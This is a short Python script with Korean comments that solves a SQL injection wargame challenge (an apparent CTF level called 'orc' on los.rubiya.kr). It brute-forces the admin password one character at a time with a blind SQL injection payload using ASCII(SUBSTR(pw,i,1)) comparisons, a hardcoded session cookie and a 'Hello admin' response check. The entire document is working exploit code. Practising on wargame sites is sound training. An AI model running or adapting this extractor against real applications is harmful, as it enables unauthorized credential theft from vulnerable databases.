import string
import requests
my_cookies=dict(PHPSESSID="ho974fglouenjchu2d3jeov8km") #쿠키 값
idLength=8	#pw 길이
url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"	#url
abc=string.digits + string.ascii_letters	#abc에 숫자와 ascii 문자 넣음
print("Start Blind attack")	#공격시작
result=""			#완성된 pw를 담을 result

for i in range(1,idLength+1):	#pw 길이만큼 반복

    for a in abc:		#숫자+문자 만큼 반복
    
        param="?pw=' or ASCII(SUBSTR(pw,"+str(i)+",1))="+str(ord(a))+"%23"
        #파라미터에 i번째 문자가 a 와 같은지 확인하는 쿼리문 입력
        #ex. ?pw=' or ASCII(SUBSTR(pw,1,1))=97%23  pw의 1번째 문자가 a(아스키 코드로 97)인지 확인
        
        new_url=url+param				#URL에 파라미터를 붙임
        res=requests.get(new_url,cookies=my_cookies)	#HTTP 요청
        
        if res.text.find("<h2>Hello admin</h2>") > 0:	#응답에 Hello admin이 있으면 
            print(str(i)+"번째 char is :" + a)		#해당 문자 출력
            result += a					#result에 추가
            break					#다음 번째로 이동
print("result:"+result)		#패스워드 결과 출력